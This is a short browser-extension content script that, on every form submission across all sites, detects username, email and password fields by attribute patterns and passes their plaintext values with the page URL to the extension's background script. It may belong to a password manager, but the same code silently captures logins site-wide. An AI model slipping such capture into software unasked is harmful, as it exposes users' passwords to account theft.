let ext = typeof browser !== "undefined" ? browser : chrome;

const FIELD_MAP = {
  username: [/user/i, /login/i, /nickname/i, /account/i,/user/i],
  email: [/email/i, /mail/i],
  password: [/pass/i, /pwd/i]
};

function detectFieldType(input) {
  const attrs = [
    input.name,
    input.id,
    input.placeholder,
    input.autocomplete,
    input.type
  ].join(" ").toLowerCase();

  for (const [key, patterns] of Object.entries(FIELD_MAP)) {
    if (patterns.some(regex => regex.test(attrs))) {
      return key;
    }
  }

  return null;
}

function extractCredentials(form) {
  const result = {};

  for (const el of form.elements) {
    
    if (!el.value) continue;

    // Always trust password type
    if (el.type === "password") {
      result.password = el.value;
      continue;
    }

    const detected = detectFieldType(el);
    if (detected) {
      result[detected] = el.value;
    }
  }

  return result;
}

window.addEventListener("submit", (event) => {
  const form = event.target;
  
  if (!form || !form.elements) return;

  const credentials = extractCredentials(form);

  if (Object.keys(credentials).length > 0) {
    ext.runtime.sendMessage({
      action: "form_submission",
      data: {
        url: location.href,
        credentials
      }
    });
  }
}, true);
